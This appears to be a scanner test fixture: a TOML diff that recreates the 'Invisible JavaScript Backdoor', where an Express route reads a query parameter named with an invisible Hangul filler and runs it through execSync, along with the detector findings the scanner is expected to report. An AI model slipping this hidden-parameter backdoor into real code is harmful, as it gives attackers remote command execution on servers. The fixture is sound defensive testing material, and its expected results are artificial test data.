@@ -1,0 +1,17 @@
+kind = "risky"
+title = "Hidden extra parameter named with an invisible Hangul filler runs as a command"
+source = "recreation of 'The Invisible JavaScript Backdoor' (Certitude, 2021)"
+expect = ["OBF002 server/status.js:3", "OBF002 server/status.js:5", "EXE003 server/status.js:1", "EXE003 server/status.js:6"]
+
+[[file]]
+path = "server/status.js"
+status = "added"
+added = [
+    "const { execFile, execSync } = require('child_process');",
+    "app.get('/network_health', async (req, res) => {",
+    "  const { timeout,{{HANGUL_FILLER}} } = req.query;",
+    "  const checkCommands = ['ping -c 1 google.com', 'curl -s http://example.com/',",
+    "    {{HANGUL_FILLER}}];",
+    "  res.send(checkCommands.map((c) => execSync(c, { timeout: +timeout || 5000 })));",
+    "});",
+]
